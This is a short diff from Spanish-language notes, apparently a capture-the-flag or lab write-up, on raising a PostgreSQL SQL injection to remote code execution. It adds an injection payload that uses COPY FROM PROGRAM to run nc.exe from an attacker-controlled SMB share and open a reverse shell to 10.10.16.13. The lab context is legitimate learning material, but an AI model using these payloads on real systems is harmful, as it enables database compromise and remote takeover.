@@ -82,8 +82,8 @@ Para la versión 9.3 se puede elevar la inyección SQL a un RCE ejecución remot
 Primero vamos a crear una tabla
 `';CREATE+TABLE+cmd_exec(cmd_output+text);-- -`
 
-- Nos traemos a la maquina local el .exe del FTP poniendonos en modo binario con `binary` y luego haciendo un `get docker-toolbox.exe`
-
 Ahora vamos a ejecutar un comando
-`';COPY+cmd_exec+FROM+PROGRAM+'';--+-`
+`';COPY+cmd_exec+FROM+PROGRAM+'\\10.10.16.13\smbFolder\nc.exe+-e+cmd+10.10.16.13+443';--+`
+
+
 
